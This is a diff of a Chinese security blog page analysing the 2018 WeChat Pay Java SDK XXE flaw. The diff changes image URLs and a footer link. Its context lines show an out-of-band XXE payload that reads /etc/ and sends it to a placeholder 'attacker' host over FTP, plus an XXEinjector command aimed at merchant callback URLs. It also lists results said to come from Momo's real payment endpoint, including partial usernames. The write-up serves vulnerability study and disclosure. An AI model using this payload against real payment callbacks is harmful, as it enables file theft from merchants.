@@ -14,16 +14,16 @@
 <meta property="og:site_name" content="l1nk3r&#39;s blog">
 <meta property="og:description" content="0x01 事件描述2018年7月2日，Rose Jackcode在packetstormsecurity披露WeChat Pay SDK XXE Injection漏洞。该漏洞产生位置位于微信的XML处理功能函数，微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果。该接口主体为提供了webservice接口服务，并且接受XML格式的数据，攻击者可以构造恶意的回调">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/j349r.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/y51io.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/02jqc.jpg">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/gdc9r.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/1zgxx.png">
-<meta property="og:updated_time" content="2019-03-12T09:07:14.341Z">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/j349r.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/y51io.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/02jqc.jpg">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/gdc9r.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/1zgxx.png">
+<meta property="og:updated_time" content="2019-04-10T04:41:35.287Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="微信支付SDK开发组件漏洞">
 <meta name="twitter:description" content="0x01 事件描述2018年7月2日，Rose Jackcode在packetstormsecurity披露WeChat Pay SDK XXE Injection漏洞。该漏洞产生位置位于微信的XML处理功能函数，微信在JAVA版本的SDK中提供callback回调功能，用来帮助商家接收异步付款结果。该接口主体为提供了webservice接口服务，并且接受XML格式的数据，攻击者可以构造恶意的回调">
-<meta name="twitter:image" content="http://po8p59xe5.bkt.clouddn.com/blog/j349r.png">
+<meta name="twitter:image" content="http://l1nk3r.xmutsec.com/blog/j349r.png">
     
     
         
@@ -154,19 +154,19 @@
 <a id="more"></a> 
 <h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>安装包位置：<strong><a href="https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip" target="_blank" rel="noopener">https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip</a></strong></p>
 <p>漏洞位置在： <strong>java-sdk-v3\src\main\java\com\github\wxpay\sdk\WXPayUtil.java</strong> , 第42行：</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/j349r.png" alt="1"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/j349r.png" alt="1"></p>
 <p>这里很明显存在 <strong>xxe</strong> 漏洞，直接用 <strong>parse</strong> 解析传入的 <strong>xml</strong> 格式文本。</p>
 <p>在 <strong>readme.md</strong> 文件中，明确说明了这个方法是要起到什么作用。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/y51io.png" alt="2"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/y51io.png" alt="2"></p>
 <p>从功能来看，主要作用应该是用来接收支付结果，所以一旦攻击者获得了关键支付的安全密钥（md5-key和商家信息，将可以直接实现0元支付购买任何商品）。</p>
 <p>当然不止是一个问题，从发现者的twitter来看，似乎还有个反序列化的问题。由于java的反序列化还不熟，回头出了新版本，对比一下补丁，再补吧，或者有大佬发现了，可以和我交流一下，邮箱联系啥联系都行，让我也学习学习。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/02jqc.jpg" alt="3"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/02jqc.jpg" alt="3"></p>
 <p><strong>2018年7月3日晚更新</strong></p>
 <p>说是有反序列，可是我diff一下更新之后的，也就改了xxe，谁知道这个有没有呢.</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/gdc9r.png" alt="5"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/gdc9r.png" alt="5"></p>
 <h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">  &lt;!ENTITY % attack SYSTEM &quot;file:///etc/&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % xxe SYSTEM &quot;http://attacker:8080/shell/data.dtd&quot;;&gt;</span><br><span class="line">  %xxe;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">data.dtd:</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % shell &quot;&lt;!ENTITY % upload SYSTEM &apos;ftp://attack:33/%attack;</span><br><span class="line">&apos;&gt;&quot;&gt;</span><br><span class="line">%shell;</span><br><span class="line">%upload;</span><br><span class="line"></span><br><span class="line">or use  XXEinjector tool  【https://github.com/enjoiz/XXEinjector】</span><br><span class="line"></span><br><span class="line">ruby XXEinjector.rb --host=attacker --path=/etc   --file=req.txt --ssl</span><br><span class="line"></span><br><span class="line">req.txt :</span><br><span class="line">POST merchant_notification_url HTTP/1.1</span><br><span class="line">Host:  merchant_notification_url_host</span><br><span class="line">User-Agent: curl/7.43.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 57</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">XXEINJECT</span><br></pre></td></tr></table></figure>
 <h1 id="0x04-漏洞影响"><a href="#0x04-漏洞影响" class="headerlink" title="0x04 漏洞影响"></a>0x04 漏洞影响</h1><p>目前漏洞影响蛮大，最新版本仍然受影响，在github上找到部分之前的源代码，这个问题在2017年2月17日的时候就存在了，尚不清楚这个是不是腾讯官方sdk，但是腾讯的人应该跟进了。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/1zgxx.png" alt="4"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/1zgxx.png" alt="4"></p>
 <p>从披露来看，披露者已经攻击了陌陌和vivo，并获取了一些信息。</p>
 <p><strong>momo：</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">attack:</span><br><span class="line">notify url:    https://pay.immomo.com/weixin/notify</span><br><span class="line">cmd:  /home/</span><br><span class="line"></span><br><span class="line"> result:</span><br><span class="line">    logs</span><br><span class="line">    zhang.jiax**</span><br><span class="line">    zhang.shaol**</span><br><span class="line">    zhang.xia**</span><br></pre></td></tr></table></figure>
@@ -251,6 +251,7 @@
         
       </ul>
     </nav>
+    <a href="http://www.miitbeian.gov.cn/">闽ICP备19007817号</a> 
   </div>
 </footer>
 
